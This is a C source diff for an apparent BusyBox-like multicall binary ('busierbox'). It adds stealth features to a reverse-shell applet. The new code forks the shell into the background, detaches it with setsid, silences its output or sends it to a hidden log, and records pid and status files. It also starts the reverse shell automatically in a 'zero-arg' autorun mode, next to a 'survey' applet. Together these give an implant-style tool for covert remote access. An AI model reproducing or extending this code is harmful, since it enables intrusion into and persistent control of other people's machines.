@@ -397,6 +397,93 @@ static int should_retry_after_attempt(int attempt)
     return attempt < retry_count;
 }
 
+static int should_background_rshell(const char *transport)
+{
+    const char *zero_arg = getenv("BUSIERBOX_ZERO_ARG_CONTEXT");
+
+    if (!strcmp(transport, "ssh"))
+        return 0; /* SSH starts Dropbear/dbclient workers itself. */
+    if (!strcmp(BB_RSHELL_RUN_MODE, "background"))
+        return 1;
+    if (!strcmp(BB_RSHELL_RUN_MODE, "auto") && zero_arg && !strcmp(zero_arg, "1"))
+        return 1;
+    return 0;
+}
+
+static void write_rshell_background_status(const char *transport, pid_t pid)
+{
+    const char *guard = autorun_guard_path();
+    char path[PATH_MAX];
+    int fd;
+    time_t now = time(NULL);
+
+    if (!yes_value(BB_AUTORUN_GUARD_ENABLE))
+        return;
+    mkdir_p(guard);
+
+    snprintf(path, sizeof(path), "%s/rshell.pid", guard);
+    fd = open(path, O_CREAT | O_TRUNC | O_WRONLY, 0600);
+    if (fd >= 0) {
+        dprintf(fd, "pid=%ld\n", (long)pid);
+        close(fd);
+    }
+
+    snprintf(path, sizeof(path), "%s/rshell.status", guard);
+    fd = open(path, O_CREAT | O_TRUNC | O_WRONLY, 0600);
+    if (fd >= 0) {
+        dprintf(fd,
+                "state=starting\ntransport=%s\nencryption=%s\n"
+                "rshell_pid=%ld\nstarted_at=%ld\n",
+                transport, BB_RSHELL_ENCRYPTION, (long)pid, (long)now);
+        close(fd);
+    }
+}
+
+static int maybe_background_rshell(const char *transport)
+{
+    const char *child = getenv("BUSIERBOX_RSHELL_BACKGROUND_CHILD");
+    pid_t pid;
+
+    if ((child && !strcmp(child, "1")) || !should_background_rshell(transport))
+        return 0;
+
+    pid = fork();
+    if (pid < 0) {
+        perror("rshell: fork");
+        return -1;
+    }
+    if (pid > 0) {
+        write_rshell_background_status(transport, pid);
+        printf("rshell_background_pid=%ld\n", (long)pid);
+        printf("rshell_status=starting\n");
+        return 1;
+    }
+
+    setsid();
+    setenv("BUSIERBOX_RSHELL_BACKGROUND_CHILD", "1", 1);
+    if (!strcmp(BB_ZERO_ARG_LOG_MODE, "none")) {
+        int devnull = open("/dev/null", O_WRONLY);
+        if (devnull >= 0) {
+            dup2(devnull, STDOUT_FILENO);
+            dup2(devnull, STDERR_FILENO);
+            close(devnull);
+        }
+    } else {
+        const char *guard = autorun_guard_path();
+        char log_path[PATH_MAX];
+        int logfd;
+        mkdir_p(guard);
+        snprintf(log_path, sizeof(log_path), "%s/rshell.log", guard);
+        logfd = open(log_path, O_CREAT | O_APPEND | O_WRONLY, 0600);
+        if (logfd >= 0) {
+            dup2(logfd, STDOUT_FILENO);
+            dup2(logfd, STDERR_FILENO);
+            close(logfd);
+        }
+    }
+    return 0;
+}
+
 static const char *select_rshell_shell(char *buf, size_t bufsz, const char *payload)
 {
     const char *provider = BB_RSHELL_SHELL_PROVIDER;
@@ -508,8 +595,12 @@ int applet_rshell_main(int argc, char **argv)
             char dummy[8] = "";
             snprintf(pid_path, sizeof(pid_path), "%s/%s", guard, pid_files[k]);
             if (read_lock_pid(pid_path, &pid, dummy, sizeof(dummy)) == 0 && pid > 1) {
-                if (kill((pid_t)pid, 0) == 0 || errno != ESRCH)
+                if (!strcmp(pid_files[k], "rshell.pid")) {
+                    if (kill((pid_t)(-pid), 0) == 0 || errno != ESRCH)
+                        kill((pid_t)(-pid), SIGTERM);
+                } else if (kill((pid_t)pid, 0) == 0 || errno != ESRCH) {
                     kill((pid_t)pid, SIGTERM);
+                }
             }
             unlink(pid_path);
         }
@@ -544,6 +635,9 @@ int applet_rshell_main(int argc, char **argv)
         fputs("rshell: reverse shell is disabled in this build (BB_RSHELL_TRANSPORT=none)\n", stderr);
         return 1;
     }
+    rc = maybe_background_rshell(transport);
+    if (rc != 0)
+        return rc < 0 ? 1 : 0;
 
     if (!strcmp(transport, "builtin")) {
 #ifdef HAVE_WOLFSSL
@@ -860,8 +954,10 @@ static int run_zero_arg_mode(const char *mode)
     }
     if (!strcmp(mode, "survey"))
         return applet_survey_main(1, survey_argv);
-    if (!strcmp(mode, "rshell"))
+    if (!strcmp(mode, "rshell")) {
+        setenv("BUSIERBOX_ZERO_ARG_CONTEXT", "1", 1);
         return applet_rshell_main(1, rshell_argv);
+    }
     if (!strcmp(mode, "custom"))
         return run_custom_zero_arg();
     fprintf(stderr, "unknown zero-arg mode: %s\n", mode);
